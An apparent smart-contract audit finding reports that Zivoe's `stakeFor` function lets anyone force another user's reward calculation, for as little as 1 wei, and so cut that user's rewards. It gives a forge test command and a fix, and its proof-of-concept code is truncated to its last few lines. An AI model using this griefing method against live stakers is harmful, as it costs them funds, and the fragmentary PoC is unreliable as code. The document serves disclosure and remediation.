# stakeFor allows anyone to force reward calculations for anyone, which can cause a loss of rewards.

## Summary

Through `stakeFor(amount, address)`, anyone can force the reward calculations for the stake of any user. This is a problem since the timing of calculation influences the amount of rewards received. 

## Vulnerability Detail

The amount of rewards a staker receives are calculated by dividing the `rewardRate` by the `_totalSupply`, which gives a rewardPerToken to be multiplied by the balance of the user. 

As such, the timing of calling `earned` becomes very important. When an early investor decide to stake a massive amount, the difference in rewards between calling `earned` before the stake or after can be up to 10%. Such a critical action should only be done by the owner of the stake. 

Yet, the `stakeFor(amount,address)` function has the `updateReward(account)` modifier, which means anyone calling this function forces the reward calculation for the owner of the stake. 

This can cause a loss in an accidental or malicious manner: 

- If Alice calls  `stakeFor(10 ether, Sam)` in good faith but at a bad time, Sam can suffer a definite loss in rewards even though his stake increased. 
- If Bob calls  `stakeFor(1 wei, Sam)` in bad faith at a bad time, Sam will suffer a definite loss in rewards. 

The POC below illustrates this scenario. 

Import the console library, update the setUp function with the code provided and place the below test in zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol.
Run with forge test --rpc-url MainNetAPI --match-test test_LossRewards_ForceRewardCalculations -vv

        bob.try_approveToken(address(ZVE),address(stZVE), 1);

        console.log("Percentage loss: %s%", originalRewards - actualRewards );
        hevm.stopPrank();

    }
```

## Impact

I believe this meets the criteria for a Medium for the following reasons:

- There is a definite loss of funds, with the constraining condition of a large move in token supply.
- Harming any user is extremely simple and costs as little as 1 wei.
- Even actions in good faith can cause a loss.

## Recommendation

Remove the updateReward modifier from the stakeFor function.
